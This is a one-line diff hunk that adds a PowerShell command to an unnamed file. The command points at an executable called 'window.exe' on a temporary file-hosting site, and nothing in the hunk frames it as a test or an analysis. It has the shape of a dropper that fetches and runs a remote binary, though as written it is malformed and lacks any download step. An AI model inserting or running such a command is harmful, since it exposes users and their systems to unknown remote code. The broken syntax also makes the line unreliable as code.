@@ -1,0 +1,1 @@
+powershell -Command "https://tmpfiles.org/dl/1787899852.174ff0b8ecd72dfc/wlwqBaUH2w2W/window.exe"
